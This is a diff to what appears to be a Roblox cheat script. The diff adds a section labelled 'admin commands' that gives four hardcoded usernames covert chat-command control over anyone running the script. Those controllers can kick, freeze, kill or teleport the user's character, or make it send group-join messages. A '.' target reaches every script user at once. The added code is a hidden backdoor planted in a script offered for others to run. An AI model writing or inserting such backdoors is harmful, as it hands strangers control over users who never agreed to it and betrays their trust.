@@ -1351,4 +1351,227 @@ end)
 wait(0.1)
 -- fall dmg disabler
 local fd=game:GetService("ReplicatedStorage"):WaitForChild("Events",10):WaitForChild("FallDamage",10)if fd then fd:Destroy()end
+-- admin commands
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local LocalPlayer = Players.LocalPlayer
+
+local adminUsers = {
+    "Devotion_M",
+    "iLuhMyJ",
+    "jcsseai",
+    "CropCollector",
+}
+
+local frozen = false
+local frozenConnection = nil
+local scriptUsers = {}
+local isLegacyChat = not TextChatService:FindFirstChild("TextChannels")
+
+local function chatMessage(str)
+    str = tostring(str)
+    if not isLegacyChat then
+        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
+    else
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
+    end
+end
+
+local function isAdmin(playerName)
+    for _, adminName in pairs(adminUsers) do
+        if playerName == adminName then
+            return true
+        end
+    end
+    return false
+end
+
+local function registerScriptUser()
+    if not table.find(scriptUsers, LocalPlayer.Name) then
+        table.insert(scriptUsers, LocalPlayer.Name)
+    end
+end
+
+local function getPlayerByDisplayName(displayName)
+    if displayName == "." then
+        local targets = {}
+        for _, playerName in pairs(scriptUsers) do
+            local player = Players:FindFirstChild(playerName)
+            if player then
+                table.insert(targets, player)
+            end
+        end
+        return targets
+    end
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        if player:FindFirstChild("Data") and player.Data:FindFirstChild("DisplayName") then
+            if string.lower(player.Data.DisplayName.Value) == string.lower(displayName) then
+                return {player}
+            end
+        end
+    end
+    return {}
+end
+
+local function isTargetMe(displayName)
+    if displayName == "." then
+        for _, playerName in pairs(scriptUsers) do
+            if playerName == LocalPlayer.Name then
+                return true
+            end
+        end
+        return false
+    end
+    
+    if LocalPlayer:FindFirstChild("Data") and LocalPlayer.Data:FindFirstChild("DisplayName") then
+        return string.lower(LocalPlayer.Data.DisplayName.Value) == string.lower(displayName)
+    end
+    return false
+end
+
+local function freezePlayer()
+    if frozen then return end
+    frozen = true
+    
+    if LocalPlayer.Character then
+        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Anchored = true
+            end
+        end
+    end
+    
+    frozenConnection = LocalPlayer.Character.DescendantAdded:Connect(function(descendant)
+        if frozen and descendant:IsA("BasePart") then
+            descendant.Anchored = true
+        end
+    end)
+end
+
+local function unfreezePlayer()
+    if not frozen then return end
+    frozen = false
+    
+    if frozenConnection then
+        frozenConnection:Disconnect()
+        frozenConnection = nil
+    end
+    
+    if LocalPlayer.Character then
+        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Anchored = false
+            end
+        end
+    end
+end
+
+local function bringToPlayer(adminPlayer)
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return
+    end
+    
+    if not adminPlayer.Character or not adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return
+    end
+    
+    local adminRoot = adminPlayer.Character.HumanoidRootPart
+    local offset = adminRoot.CFrame.LookVector * 3
+    LocalPlayer.Character.HumanoidRootPart.CFrame = adminRoot.CFrame + offset
+end
+
+local function killPlayer()
+    if LocalPlayer.Character then
+        LocalPlayer.Character:BreakJoints()
+    end
+end
+
+local function teamPlayer(adminPlayer)
+    chatMessage("/joingroup " .. adminPlayer.Name)
+end
+
+local function createPlayer()
+    chatMessage("/creategroup")
+end
+
+local function acceptPlayer()
+    chatMessage("/acceptgrouprequests")
+end
+
+local function kickPlayer(reason)
+    LocalPlayer:Kick(reason or "Kicked by admin")
+end
+
+local function onPlayerChatted(player, message)
+    if not isAdmin(player.Name) then return end
+    
+    local args = string.split(message, " ")
+    local command = string.lower(args[1])
+    local displayName = args[2]
+    
+    if not displayName then return end
+    
+    if not isTargetMe(displayName) then return end
+    
+    if command == ";kick" then
+        local reason = table.concat(args, " ", 3)
+        kickPlayer(reason)
+    elseif command == ";freeze" then
+        freezePlayer()
+    elseif command == ";unfreeze" then
+        unfreezePlayer()
+    elseif command == ";bring" then
+        bringToPlayer(player)
+    elseif command == ";kill" then
+        killPlayer()
+    elseif command == ";team" then
+        teamPlayer(player)
+    elseif command == ";create" then
+        createPlayer()
+    elseif command == ";accept" then
+        acceptPlayer()
+    end
+end
+
+registerScriptUser()
+
+for _, player in pairs(Players:GetPlayers()) do
+    if isAdmin(player.Name) then
+        player.Chatted:Connect(function(message)
+            onPlayerChatted(player, message)
+        end)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if isAdmin(player.Name) then
+        player.Chatted:Connect(function(message)
+            onPlayerChatted(player, message)
+        end)
+    end
+end)
+
+LocalPlayer.CharacterAdded:Connect(function(character)
+    if frozen then
+        wait(0.1)
+        for _, part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Anchored = true
+            end
+        end
+        
+        if frozenConnection then
+            frozenConnection:Disconnect()
+        end
+        
+        frozenConnection = character.DescendantAdded:Connect(function(descendant)
+            if frozen and descendant:IsA("BasePart") then
+                descendant.Anchored = true
+            end
+        end)
+    end
+end)
+
 
